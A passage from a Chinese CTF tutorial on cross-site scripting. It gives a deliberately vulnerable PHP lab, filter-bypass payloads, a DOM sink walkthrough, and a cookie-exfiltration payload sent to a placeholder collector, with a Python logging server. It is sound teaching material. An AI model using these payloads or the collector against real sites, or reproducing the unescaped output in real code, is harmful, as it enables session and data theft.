---
chapter: Web安全
section: XSS
order: 608
tags:
  - CTF
  - Web安全
  - XSS
  - 前端
publish: true
---

# W08 XSS
## Cross-Site Scripting

> [!info]- 章节信息
> **所属方向**：Web 安全 ｜ **难度阶段**：L2 核心漏洞期 ｜ **前置要求**：[[11-Web安全版图与Burp|11 章]] · [[W01-Web安全导论与HTTP深化|W01]] · [[W03-信息泄露与前端安全|W03]]
> **本章目标**：分清反射型、存储型、DOM 型三型的界定标准；在自建靶场上掌握事件处理器、标签变体、实体编码、属性内注入等 payload 构造技术；对常见黑名单过滤逐级绕过；会从前端源码定位 DOM 型的 sink；用收集器走通偷 cookie 与盲 XSS 的带外链路；读懂 CSP 各指令并知道弱配置为什么挡不住注入；最后落到 `htmlspecialchars`、HttpOnly 与 CSP 组成的防御。

[[11-Web安全版图与Burp|11 章]] 3.6 用十几行 Python 做过 XSS 的最小演示：`?name=` 未转义拼进 HTML，偷 cookie 的 payload 一行，bot 机制一句话。那一小节回答的是"XSS 存在"；本章回答剩下的全部问题——payload 有哪些构造方式、过滤器怎么绕、不回显时怎么打、防御该怎么写。全部实验在自建的 PHP 靶场上进行，靶场代码完整给出。

XSS 与前几章有一个根本差别：==漏洞的最终执行端是浏览器，curl 只能证明 payload 进入响应，不能证明它被执行==。因此本章的实验分两种形态：注入点、回显、响应头、落库结果这些服务端事实，一律用 curl 取证，命令配输出；弹窗、执行、拦截这类浏览器行为，写明访问哪个 URL 后会发生什么、在 DevTools 的哪个面板看，不再配输出。自己复现时也按这条线分清证据。

> [!note] 本章约定
> 所有 curl 统一加 `--noproxy '*'`：系统代理软件可能改写响应内容，该参数让 curl 直连目标（[[11-Web安全版图与Burp|11 章]]常见问题表讲过这个坑）。URL 编码沿用 [[W04-SQL注入|W04]] 的约定：`<` 写 `%3C`、`>` 写 `%3E`、`"` 写 `%22`、`'` 写 `%27`、空格写 `%20`、反引号写 `%60`，`&` 会截断参数，值里的 `&` 要写 `%26`。

## 1. 三型界定：payload 的位置与持久性

XSS 分三型，区分标准只有两条：==payload 存在哪里、能活多久==。

| 类型 | payload 在哪里 | 持久性 | 典型入口 | 谁会中招 |
| ---- | ---- | ---- | ---- | ---- |
| 反射型 | 当前请求的参数，服务端取出后原样放进本次响应 | 不落库，响应结束就没了 | `?name=`、搜索框 | 被诱导访问该 URL 的人 |
| 存储型 | 落进服务端存储（数据库、文件），由某个页面读出来渲染 | 每次读取都在，直到被删除 | 留言板、评论、个人资料 | 所有访问该页面的人 |
| DOM 型 | 前端 JS 从浏览器接口取值直接写进 DOM | 可以完全不经过服务器 | URL 的 `#` 部分、前端路由参数 | 被诱导访问该 URL 的人 |

三型是按 payload 的流动路径分的，不是按危害分的。反射型要诱导每个受害者点特定链接，影响面小；存储型落一次库打所有访问者，是留言板类题目的主要威胁；DOM 型的特殊点在第 5 节展开——它的 payload 可以让服务器完全看不到。

11 章 3.6 的最小靶是反射型：`?name=` 的值只活在那一次响应里。判断一个注入点属于哪一型，操作上就是三个动作：换参数看响应（反射型）、提交内容再看别的页面（存储型）、读前端源码找 sink（DOM 型）。

## 2. 自建靶场

### 2.1 靶场代码

靶场在 8801 端口，一面反射、一面存储，共用一个 PHP 内置服务器。目录结构：

```
w08/
├── www08/              # Web 根，php -S 的 -t 指向这里
│   ├── index.php       # 留言板：POST 存进 SQLite，列表页原样回显（存储型）
│   ├── reflect.php     # ?name= 原样嵌进 HTML（反射型）
│   └── board.sqlite    # 留言库（运行后生成）
└── collector.py        # 收集器，6.3 节用，8804 端口
```

`index.php` 全文：

```php
<?php
/* index.php —— 留言板靶：POST 存进 SQLite，列表页原样回显（存储型 XSS） */
$db = new PDO('sqlite:' . __DIR__ . '/board.sqlite');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$db->exec('CREATE TABLE IF NOT EXISTS msgs(id INTEGER PRIMARY KEY AUTOINCREMENT, msg TEXT)');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $st = $db->prepare('INSERT INTO msgs(msg) VALUES (?)');
    $st->execute([$_POST['msg'] ?? '']);
}
?>
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>留言板</title></head>
<body>
<h1>留言板</h1>
<form method="post" action="/index.php">
  <textarea name="msg" rows="3" cols="40"></textarea>
  <button type="submit">提交留言</button>
</form>
<ul>
<?php foreach ($db->query('SELECT id, msg FROM msgs ORDER BY id DESC') as $row): ?>
  <li>#<?= $row['id'] ?> <?= $row['msg'] ?></li>
<?php endforeach; ?>
</ul>
</body>
</html>
```

注意这段代码的分工：入库用的是 `prepare` + `execute` 的参数化写法（[[W04-SQL注入|W04]] 第 10 节的防御），SQL 注入这条路是堵死的；但第 20 行把 `msg` 原样 echo 进 HTML，XSS 的门开着。==参数化查询单独使用时，防的是 SQL 注入，不防 XSS==——数据安全地进了库，出来时照样能变成代码。

`reflect.php` 全文，就是 11 章 3.6 最小靶的 PHP 版：

```php
<?php
/* reflect.php —— ?name= 原样嵌进 HTML（反射型 XSS） */
$name = $_GET['name'] ?? 'guest';
?>
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>欢迎</title></head>
<body>
<h1>Hello, <?= $name ?>!</h1>
</body>
</html>
```

> [!warning] 库文件放在了 Web 根里
> 为了省事，`board.sqlite` 就放在 Web 根下，`php -S` 会把它当静态文件送给任何来要的人：
>
> ```bash
> curl -s --noproxy '*' http://127.0.0.1:8801/board.sqlite | head -c 16 | od -c | head -2
> ```
>
> 输出：
>
> ```
> 0000000   S   Q   L   i   t   e       f   o   r   m   a   t       3  \0
> 0000020
> ```
>
> 文件头 `SQLite format 3` 说明整个留言库可以被直接下载。这是 [[W03-信息泄露与前端安全|W03]] 讲过的一类问题：部署到 Web 根的每个文件都是 URL。真实项目把库移出 Web 根，或者放 Web 服务器拒绝直连的位置。

### 2.2 注入点确认

启动靶场：

```bash
php -S 127.0.0.1:8801 -t www08 &
curl -s --noproxy '*' http://127.0.0.1:8801/reflect.php
```

输出：

```
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>欢迎</title></head>
<body>
<h1>Hello, guest!</h1>
</body>
</html>
```

反射型注入点。发一个 `<script>`，看它是否原样进入 HTML（URL 编码后是 `%3Cscript%3E`）：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8801/reflect.php?name=%3Cscript%3Ealert(1)%3C/script%3E' | grep h1
```

输出：

```
<h1>Hello, <script>alert(1)</script>!</h1>
```

payload 原样进了响应的 HTML 结构里。curl 不执行 JS（11 章讲过），这份输出证明的是服务端事实：==注入点没有做任何转义，`<script>` 以标签的形状到达了浏览器==。在浏览器访问同一个 URL，页面加载过程中 alert 弹出——`<script>` 在 HTML 解析到它时同步执行。

存储型注入点。往留言板 POST 一条带 payload 的留言，再看列表页：

```bash
curl -s --noproxy '*' -d 'msg=<img src=x onerror=alert(1)>' http://127.0.0.1:8801/index.php -o /dev/null -w '%{http_code}\n'
curl -s --noproxy '*' http://127.0.0.1:8801/index.php
```

输出：

```
200
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>留言板</title></head>
<body>
<h1>留言板</h1>
<form method="post" action="/index.php">
  <textarea name="msg" rows="3" cols="40"></textarea>
  <button type="submit">提交留言</button>
</form>
<ul>
  <li>#1 <img src=x onerror=alert(1)></li>
</ul>
</body>
</html>
```

两个服务端事实都拿到了：payload 落了库（再访问时还在），并且原样进了列表页的 HTML。从这一刻起，==任何打开留言板列表页的浏览器都会执行这条 payload==，不需要任何人的额外操作——这就是存储型与反射型的实际差别。在浏览器打开列表页即可看到效果；用 DevTools 的 Elements 面板能看到 `<li>` 里已经是真实的 `<img>` 节点，而不是文本。

## 3. payload 构造技术

`<script>alert(1)</script>` 是最出名的 payload，也是被过滤得最狠的。构造 payload 是在回答三个问题：输入落在页面的哪个位置（上下文）、怎么让它执行（事件还是加载即执行）、被过滤了怎么办（第 4 节）。本节每条 payload 都贴出服务端回显，浏览器侧行为只在需要时说明。

### 3.1 事件处理器

HTML 的事件属性值是一段 JS，浏览器解析到标签就把它绑定上去，事件发生时执行。主流 payload 都是事件属性：==不用 `<script>` 标签，也能让浏览器执行 JS==。常用组合：

| payload 片段 | 执行时机 |
| ---- | ---- |
| `<img src=x onerror=alert(1)>` | `src` 加载失败立刻触发（`x` 是不存在的路径，必然失败） |
| `<svg onload=alert(1)>` | 解析到标签即执行，无需任何交互 |
| `<input onfocus=alert(1) autofocus>` | `autofocus` 让输入框加载后自动获得焦点，`onfocus` 随即执行，无需交互 |
| `<a href="javascript:alert(1)">text</a>` | 需要受害者点击链接 |

逐条发到反射靶上看回显：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8801/reflect.php?name=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E' | grep h1
curl -s --noproxy '*' 'http://127.0.0.1:8801/reflect.php?name=%3Csvg%20onload%3Dalert(1)%3E' | grep h1
```

输出：

```
<h1>Hello, <img src=x onerror=alert(1)>!</h1>
<h1>Hello, <svg onload=alert(1)>!</h1>
```

两条都原样通过。CTF 里探测 XSS 注入点优先用 `<svg onload=alert(1)>`：它不需要任何交互，弹窗即证明执行；`<img src=x onerror=...>` 同样无交互，差别只在触发时机——前者等 `src` 加载失败，后者解析到标签就执行。`onfocus` + `autofocus` 的组合价值在属性内注入（3.5 节），它也是无交互的。

> [!note] 无交互 payload 优先
> 反射型 XSS 要"有人访问那个 URL"才有意义。需要点击、悬停才能触发的 payload，受害者不点就不执行；`onload`/`onerror`/`autofocus` 这类页面加载即触发的构造不依赖受害者配合，配 bot 定靶（第 6 节）时全部用这一类。

### 3.2 标签变体

`<script>` 之外还有多个能执行 JS 的标签形态。两个有额外用处的：

`<iframe srcdoc>`：`srcdoc` 属性的值被当作 iframe 内部的文档解析，里面的标签要用实体写（属性值里不能出现裸的 `<`，会破坏外层文档的语法）：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8801/reflect.php?name=%3Ciframe%20srcdoc=%22%26lt;script%26gt;alert(1)%26lt;/script%26gt;%22%3E' | grep h1
```

输出：

```
<h1>Hello, <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">!</h1>
```

浏览器解析 `srcdoc` 的值时把 `&lt;` `&gt;` 解码回 `<` `>`，iframe 内部的文档里就有了完整的 `<script>alert(1)</script>` 并执行。这是实体编码的正当用途之一：在属性值里携带标签。

`<a href="javascript:...">`：`javascript:` 伪协议的链接，点击时把后面的串当代码执行：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8801/reflect.php?name=%3Ca%20href=%22javascript:alert(1)%22%3Eclick%3C/a%3E' | grep h1
```

输出：

```
<h1>Hello, <a href="javascript:alert(1)">click</a>!</h1>
```

它需要点击，做探测不如事件属性，但在"只能控制一个 URL/属性值"的场合（比如某些过滤后只剩 `href` 可控）是主要出路。

### 3.3 大小写与斜杠变体

HTML 的标签名与属性名**不区分大小写**，标签内的属性分隔符**空格与 `/` 等价**：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8801/reflect.php?name=%3CSVG%20ONLOAD=alert(1)%3E' | grep h1
curl -s --noproxy '*' 'http://127.0.0.1:8801/reflect.php?name=%3Csvg/onload=alert(1)%3E' | grep h1
```

输出：

```
<h1>Hello, <SVG ONLOAD=alert(1)>!</h1>
<h1>Hello, <svg/onload=alert(1)>!</h1>
```

两个变体在浏览器里行为完全相同。它们本身不构成新的执行方式，价值在过滤阶段：区分大小写地匹配 `<svg` 的过滤器挡不住 `<SVG`，按空格切分属性的过滤器挡不住 `/`（4.4 节用到）。

> [!warning] JS 部分的大小写不能动
> 变体只作用于 HTML 层。属性值里的 JS 是另一套语法：`onload=alert(1)` 写成 `onload=ALERT(1)` 直接报错。`<SVG ONLOAD=ALERT(1)>` 不是合法的绕过，`<SVG ONLOAD=alert(1)>` 才是。

### 3.4 HTML 实体编码与解码层级

HTML 实体是字符的另一种写法，两种形式：命名实体（`&lt;` 表示 `<`）与数字实体（`&#x6a;` 是十六进制的 `j`，`&#106;` 是十进制写法）。浏览器的处理顺序：==解析 HTML 时先解码实体，再按上下文继续处理——属性值里的 `&#x6a;` 会先变回 `j`，然后才被当成 URL 的协议名去读==。

用这个顺序构造绕过。过滤器通常在找字面量 `javascript:`，把 `j` 写成实体：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8801/reflect.php?name=%3Ca%20href=%22%26%23x6a;avascript:alert(1)%22%3Ex%3C/a%3E' | grep h1
```

输出：

```
<h1>Hello, <a href="&#x6a;avascript:alert(1)">x</a>!</h1>
```

服务端原样回显，字符串里找不到 `javascript`。浏览器解析这个 `<a>` 标签时：先解码 `href` 的属性值得到 `javascript:alert(1)`，再按 URL 规则读取协议——点击链接照样执行。==实体编码绕过的是"过滤器在找什么"，成立的前提是解码发生在过滤之后==。

> [!info]- 三层解码与"双重解码漏洞"
> 一次点击的完整解码链可能有三层：HTML 解析层（实体 `&#x..;`）、URL 层（`%xx`）、JS 层（`\uXXXX`）。每层各归各的解析器处理。漏洞高发位置在"解码两次"：服务端先解码一次再做过滤，浏览器又解码一次，过滤时看到的样子和执行时看到的样子不一样。典型代码是先 `urldecode($_GET['x'])` 再匹配黑名单，然后存库原样输出——发一次 `%3Csvg` 被服务端还原成 `<svg` 直接进 HTML。审代码时盯住"解码函数在过滤函数之前"的组合；测目标时，单层编码和双层编码各发一遍（[[W03-信息泄露与前端安全|W03]] 1.2 的编码探测同理）。

### 3.5 属性内注入：引号逃逸

前面都假设输入落在 HTML 正文里，可以自由加标签。另一类高频场景：==输入被套进已有标签的属性值里==，比如搜索页回填输入框：

```
<input type="text" name="name" value="{输入}">
```

这时不需要 `<>` 也能注入：用一个引号闭掉 `value` 属性，追加事件属性，再补一个引号让后面的 HTML 合法。payload：

```
x" onfocus=alert(1) autofocus="
```

发到过滤靶（`filter.php`，4.1 节详述，这里先用它的 level 0 无过滤模式看落点）：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8801/filter.php?name=x%22%20onfocus=alert(1)%20autofocus=%22' | grep -E 'result|input'
```

输出：

```
<div class="result">x" onfocus=alert(1) autofocus="</div>
  <input type="text" name="name" value="x" onfocus=alert(1) autofocus="">
```

读 `input` 这一行：`value` 的属性值在第二个引号处闭合，只剩下 `x`；`onfocus=alert(1)` 和 `autofocus` 从属性值里浮出来，成了 `input` 自己的属性；payload 末尾的引号与模板自带的收尾引号拼成空属性 `autofocus=""`，模板的 `>` 随手把标签关上——语法完整。页面加载后输入框自动获得焦点，`onfocus` 执行，无需交互。

打 XSS 的第一步永远是确认上下文：先发一个标记串，看它回显在响应的哪个位置。

> [!note] 上下文探测
> 向参数发 `"''<>()` 这样的混合标记串，curl 拿到响应后看它落在哪：原样出现在两个标签**之间**，是正文上下文（可加标签）；被包进 `value="..."` 之类属性里，是属性上下文（引号逃逸）；出现在 `<script>` 代码段的字符串里，是 JS 上下文（闭字符串再注入，如 `";alert(1)//`）。三种上下文对应三种构造，混用是 payload 不生效的常见原因。

## 4. 过滤绕过阶梯

真实目标常有黑名单过滤。本节在一个可调级别的过滤靶上逐级收紧、逐级绕，每一级都留服务端回显证据。

### 4.1 过滤靶

`filter.php`（已随靶场给出，放在 `www08/` 下）。参数 `name` 是注入点，`level` 选择过滤策略——==三级互不叠加，每级是一种独立的过滤实现==，对应真实世界里三种常见的写法；过滤后的结果回显在两处上下文：正文 `<div>` 和 `<input>` 的 `value` 属性，这也是真实页面的常见形状（同一个输入出现在多个位置）：

```php
<?php
/* filter.php —— 过滤靶：level 选过滤策略（各级互不叠加），过滤结果回显在正文与属性两处上下文 */
$level = (int)($_GET['level'] ?? 0);
$raw   = $_GET['name'] ?? 'guest';

function xss_filter(string $s, int $level): string
{
    switch ($level) {
        case 1:                                   // 删除式：只删一遍开标签 <script>（大小写不敏感）
            return str_ireplace('<script>', '', $s);
        case 2:                                   // 删除所有尖括号
            return str_replace(['<', '>'], '', $s);
        case 3:                                   // 删除引号
            return str_replace(['"', "'"], '', $s);
        default:
            return $s;
    }
}
$out = xss_filter($raw, $level);
?>
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>搜索</title></head>
<body>
<h1>搜索结果（filter level <?= $level ?>）</h1>
<div class="result"><?= $out ?></div>
<form>
  <input type="text" name="name" value="<?= $out ?>">
</form>
</body>
</html>
```

### 4.2 Level 1：拦 script 标签

Level 1 把 `<script>`（开标签整体，大小写不敏感）删一遍。裸的 script payload 先看结果：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8801/filter.php?level=1&name=%3Cscript%3Ealert(1)%3C/script%3E' | grep -E 'result|input'
```

输出：

```
<div class="result">alert(1)</script></div>
  <input type="text" name="name" value="alert(1)</script>">
```

开标签没了，`alert(1)` 沦为正文文本，`</script>` 是个孤儿闭标签，浏览器直接丢弃——注入不成立。两条绕过路：

**换标签事件。** 过滤器只认 `<script>`，换成事件属性的写法，一个被过滤的字符都没有：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8801/filter.php?level=1&name=%3Csvg%20onload=alert(1)%3E' | grep -E 'result|input'
```

输出：

```
<div class="result"><svg onload=alert(1)></div>
  <input type="text" name="name" value="<svg onload=alert(1)>">
```

**关键字拆分。** "删除式"过滤有一个结构性破绽：==它只扫一遍，删完不会再回头看删除的结果==。把关键字拆开，让删除动作恰好把"垫片"删掉、把两半拼回关键字：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8801/filter.php?level=1&name=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/script%3E' | grep -E 'result|input'
```

输出：

```
<div class="result"><script>alert(1)</script></div>
  <input type="text" name="name" value="<script>alert(1)</script>">
```

输入是 `<scr<script>ipt>alert(1)</script>`：中间的 `<script>` 被删掉，剩下的 `<scr` 和 `ipt>` 正好拼回 `<script>`。`<script>` 从头到尾是攻击者提供的，过滤器自己把它组装了出来。

> [!info]- 拆分与过滤器的两个变体
> 拆分法对付的是"删除一遍"型。垫片的选取规律：==过滤器删什么，什么就能当垫片==——`<scr<script>ipt>` 里当垫片的是被删的 `<script>` 本身。过滤器若把 `</script>` 也一起删（常见），一次拆分只复原得了开标签，闭标签会被顺手删掉，此时同样的思路移到事件属性上：拦 `onerror` 的过滤器用 `on<onerror>error=alert(1)` 复原出事件属性。若过滤器是"命中即拒绝"型（正则匹配到就 403，不做删除），拆分无从谈起——payload 根本发不进去，此时只能用换标签、换大小写这类"不包含被拦关键字"的构造。另一个极端是循环删除直到匹配不到的实现，拆分也失效。判断属于哪种：发一次 `<scr<script>ipt>`，看回显里出现的是拼回的关键字（删除一遍型）、被删干净（循环型）还是 403（拒绝型）。

### 4.3 Level 2：拦尖括号

Level 2 删掉所有 `<` 和 `>`，任何标签都构造不出来：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8801/filter.php?level=2&name=%3Csvg%20onload=alert(1)%3E' | grep -E 'result|input'
```

输出：

```
<div class="result">svg onload=alert(1)</div>
  <input type="text" name="name" value="svg onload=alert(1)">
```

正文里只剩纯文本，事件属性没了宿主标签。先试一条直觉上的路——实体编码：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8801/filter.php?level=2&name=%26lt;svg%20onload=alert(1)%26gt;' | grep -E 'result|input'
```

输出：

```
<div class="result">&lt;svg onload=alert(1)&gt;</div>
  <input type="text" name="name" value="&lt;svg onload=alert(1)&gt;">
```

`&lt;` 原样出现在响应里——服务端没解码它。浏览器拿到后会把它解码成 `<`，==但解码结果进入的是文本节点，不会再被当成标签解析==：页面上显示的是一行字 `<svg onload=alert(1)>`，标签不存在。这就是 3.4 节埋的伏笔：实体编码只在"解码后需要成为**属性值内容**"时有用（`href` 里的 `&#x6a;`），解码后需要成为**标签结构**时没用——文本层的解码不参与 HTML 结构解析。

正文走不通，可行入口在属性上下文。属性内注入（3.5 节）全程不需要尖括号：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8801/filter.php?level=2&name=x%22%20onfocus=alert(1)%20autofocus=%22' | grep -E 'result|input'
```

输出：

```
<div class="result">x" onfocus=alert(1) autofocus="</div>
  <input type="text" name="name" value="x" onfocus=alert(1) autofocus="">
```

`value` 被引号闭死，`onfocus` 与 `autofocus` 成了标签属性。==正文上下文被拦死时，逐个检查其他回显点，只要有一处是属性或 JS 上下文，注入就还有入口==。

### 4.4 Level 3：拦引号

Level 3 删掉 `"` 和 `'`。属性内注入的 payload 恰好依赖引号，先看它怎么失效：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8801/filter.php?level=3&name=x%22%20onfocus=alert(1)%20autofocus=%22' | grep -E 'result|input'
```

输出：

```
<div class="result">x onfocus=alert(1) autofocus=</div>
  <input type="text" name="name" value="x onfocus=alert(1) autofocus=">
```

引号没了，整串内容都困在 `value="..."` 内部，成了输入框的初始值。引号过滤的盲区：==事件 payload 本身可以不含引号==——JS 调用不带字符串参数时（`alert(1)`），整个构造一个引号都用不到：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8801/filter.php?level=3&name=%3Csvg%20onload=alert(1)%3E' | grep -E 'result|input'
```

输出：

```
<div class="result"><svg onload=alert(1)></div>
  <input type="text" name="name" value="<svg onload=alert(1)>">
```

原样通过。JS 里必须用字符串时，有不含引号的替代写法：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8801/filter.php?level=3&name=%3Cimg%20src=x%20onerror=alert(String.fromCharCode(88,83,83))%3E' | grep result
```

输出：

```
<div class="result"><img src=x onerror=alert(String.fromCharCode(88,83,83))></div>
```

`String.fromCharCode(88,83,83)` 构造出字符串 `XSS`，不出现任何引号；读 `document.cookie` 这类属性访问同样不需要引号。

两个相关变体。**斜杠**：`<svg/onload=alert(1)>`，用 `/` 代替属性间的空格——引号过滤的靶子上它顺带成立，它真正针对的是"空格也被拦"的过滤器（发一发即可确认回显原样，浏览器行为与带空格版本相同）。**反引号**：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8801/filter.php?level=3&name=%3Csvg%20onload=alert%601%60%3E' | grep result
```

输出：

```
<div class="result"><svg onload=alert`1`></div>
```

反引号在过滤器眼里是普通字符，原样通过。它在浏览器里有两种历史语义：老版本 IE 曾把属性值里的反引号当引号处理，于是"没闭合的属性"在 IE 上能执行——这是反引号绕过的出处；现代浏览器里反引号是 JS 的模板字符串语法，`` alert`1` `` 是合法的标签模板调用，alert 照样执行，但"反引号顶替属性引号"的逃逸只存在于老 IE。

## 5. DOM 型 XSS：sink 在前端源码里

前两节里 payload 至少经过一次服务器。DOM 型不同：==前端 JS 自己把可控数据写进危险函数，服务器可以全程零参与==。

两个术语贯穿这一节：

| 术语 | 含义 | 常见成员 |
| ---- | ---- | ---- |
| source | 数据从哪进来 | `location.search`、`location.hash`、`location.href`、`document.referrer`、`window.name`、`postMessage` |
| sink | 数据写到哪去会出事 | `innerHTML` / `outerHTML`、`document.write`、`eval` / `new Function`、`setTimeout` 的字符串参数、`location = 'javascript:...'` |

source 的值经过危险 sink 写进 DOM，就是 DOM 型 XSS。靶场是一面纯静态页 `dom.html`，两个 source 两条 sink：

```html
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>站内搜索</title></head>
<body>
<h1>站内搜索</h1>
<div id="hint"></div>
<div id="result"></div>
<script>
  // source：location.search 与 location.hash
  var params = new URLSearchParams(location.search);
  var q = params.get('q') || '';
  var hash = decodeURIComponent(location.hash.slice(1));

  // sink：两处 innerHTML，source 未过滤直接拼入
  document.getElementById('hint').innerHTML = '搜索关键词：' + q;
  document.getElementById('result').innerHTML = hash;
</script>
</body>
</html>
```

先用 curl 建立服务端事实。带 payload 的 query 和不带 payload 的裸地址各取一次，比对响应：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8801/dom.html?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E' | md5sum
curl -s --noproxy '*' http://127.0.0.1:8801/dom.html | md5sum
```

输出：

```
aa15b9002c0a5042980a13e129b1cb4b  -
aa15b9002c0a5042980a13e129b1cb4b  -
```

两个 MD5 完全一致：==payload 有没有、是什么，服务器一概不知==。`?q=` 后面的部分只在浏览器里被 JS 读取；`#` 后面的部分更彻底——浏览器发请求时根本不带 fragment。这就是 DOM 型与反射型的分界：反射型查服务端代码的拼接点，DOM 型查前端源码的 sink。

浏览器侧的确认。访问：

```
http://127.0.0.1:8801/dom.html#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

页面加载后执行。DevTools 确认路径：Elements 面板搜 `result`，能看到 `<img src=x onerror=alert(1)>` 已作为真实节点插入 `#result` 内部；Network 面板里这条文档请求的 URL 不包含 `#` 后的任何内容。`?q=` 一路同理，payload 换到 query 里、DOM 落点换成 `#hint`。

**源码层面定位 sink 的方法**。拿到目标的前端 JS（收集方法见 [[W03-信息泄露与前端安全|W03]] 第 5 节，DevTools 的 Sources 面板可以直接搜），按三步走：

1. 全局搜 sink 关键字：`innerHTML`、`document.write`、`eval`、`setTimeout(`；
2. 对每处命中，反查赋值号的右边数据从哪来——追到 `location`、`referrer`、`name`、消息事件这些 source 就是有嫌疑；
3. 确认 source 到 sink 之间没有编码/白名单处理，再按上下文构造 payload。

动态确认的手段：Sources 面板在 sink 那一行下断点，触发一次交互，看暂停时右侧变量的值是不是可控数据。

> [!note] DOM 型也分"服务端可见"与"服务端不可见"
> source 是 `location.search` 时，payload 在请求里，服务器日志看得到，只是响应里没有；source 是 `location.hash` 时，payload 完全不离开浏览器。两类都是 DOM 型——判定依据是"谁把数据变成 DOM"，不是"服务器看没看见"。打靶时 hash 型更隐蔽：服务器日志、WAF 都没有可拦的东西。

## 6. 危害与利用

`alert(1)` 只用来证明执行。XSS 的实际危害都来自同一件事：==注入的 JS 以受害者的身份、在受害者的浏览器里运行==。

### 6.1 偷 cookie 与 HttpOnly

危害的默认形态是外带 cookie。payload 用 JS 拼出带 cookie 的 URL 再发请求，经典写法：

```html
<img src=x onerror="new Image().src='http://收集器地址/hit?c='+document.cookie">
```

`new Image().src=...` 让浏览器向收集器发一次 GET，cookie 拼在查询参数里，受害者毫无感知。`document.cookie` 能读到什么，[[W01-Web安全导论与HTTP深化|W01]] 3.1 的结论直接适用：==带 `HttpOnly` 属性的 cookie，JS 读不到，XSS 偷不走它；但请求里照样携带，防"读"不防"用"==。

HttpOnly 不是完整防线。偷不到 cookie 时，注入的 JS 还有两条主要出路：**请求伪造**——用 JS 以受害者身份发任意请求（改邮箱、发消息、提权操作），浏览器自动带上包括 HttpOnly 在内的全部 cookie，而 SOP 拦"读"不拦"写"（[[W01-Web安全导论与HTTP深化|W01]] 5.2）；**页面内容外带**——flag 或敏感数据常在页面文本里，读 DOM 后用同样的 `new Image().src` 送出，读不到 cookie 就直接读页面。键盘记录是第三条：注入的 JS 监听按键事件，把每次按键发往收集器，对登录框而言这就是密码。

### 6.2 CTF 的 bot 机制

[[11-Web安全版图与Burp|11 章]] 3.6 一句话带过 bot，这里补齐打靶要用的全部事实：XSS 题通常配一个 bot——**headless 浏览器以管理员身份定时访问你提交的 URL**。flag 常放在 bot 的 cookie 里（不少题目还加了 HttpOnly，逼你改打页面内容或请求伪造）。打 bot 的三个要点：

1. **用无交互 payload**（3.1 节）：bot 只访问不点击；
2. **收集地址必须 bot 可达**：本地靶全在 `127.0.0.1` 互通，远程靶上你的收集器写 `127.0.0.1` bot 是够不到的——要用公网地址或题目提供的上报接口。远程题收集器收不到请求，先查这一条；
3. **payload 进什么页面要想清楚**：打反射型是提交带 payload 的 URL 让 bot 访问；打存储型是把 payload 存进 bot 会读的页面。

### 6.3 收集器演示：外带链路

用 [[06-Python与CTF脚本基础|06 章]]的 `http.server` 写一个收集器，记录到达的每个请求（路径、UA、Cookie、Referer），8804 端口：

```python
#!/usr/bin/env python3
# collector.py —— 收集器：记录到达的每个请求（路径、UA、Cookie、Referer），8804 端口
from http.server import BaseHTTPRequestHandler, HTTPServer

LOG = '/tmp/w08/hits.log'

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        with open(LOG, 'a') as f:
            f.write(f'{self.path} | UA: {self.headers.get("User-Agent", "-")} | '
                    f'Cookie: {self.headers.get("Cookie", "-")} | '
                    f'Referer: {self.headers.get("Referer", "-")}\n')
        self.send_response(200)
        self.send_header('Content-Type', 'image/gif')
        self.send_header('Content-Length', '0')
        self.end_headers()

    def log_message(self, *a):
        pass

HTTPServer(('127.0.0.1', 8804), H).serve_forever()
```

`Content-Type: image/gif` 让响应以图片类型返回，正好接住 `<img src>` 型 payload。启动：`python3 collector.py &`。

往留言板存一条外带 payload（留言 #2）：

```bash
curl -s --noproxy '*' -d 'msg=<img src="http://127.0.0.1:8804/hit?c=STEAL">' http://127.0.0.1:8801/index.php -o /dev/null -w '%{http_code}\n'
curl -s --noproxy '*' http://127.0.0.1:8801/index.php | grep '<li>'
```

输出：

```
200
  <li>#2 <img src="http://127.0.0.1:8804/hit?c=STEAL"></li>
  <li>#1 <img src=x onerror=alert(1)></li>
```

curl 能取证的到此为止：payload 已经是列表页 HTML 的一部分。接下来的事实链在浏览器侧：==任何浏览器渲染这个 `<li>` 时，会自动解析 `<img>` 并向 `src` 指向的地址发起请求==——受害者只是打开了页面，没有做任何其他事。

用 curl 直接请求 payload 里的那个 URL，模拟浏览器会自动发出的这一次请求（Cookie 与 Referer 两个头也由 `-H` 带上，真实场景里它们由浏览器自动附加）：

```bash
curl -s --noproxy '*' -H 'Cookie: role=admin; flag=c0ok13_n3v3r_hunt3d' -H 'Referer: http://127.0.0.1:8801/index.php' -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:8804/hit?c=STEAL'
cat /tmp/w08/hits.log
```

输出：

```
200
/hit?c=STEAL | UA: curl/8.18.0 | Cookie: role=admin; flag=c0ok13_n3v3r_hunt3d | Referer: http://127.0.0.1:8801/index.php
```

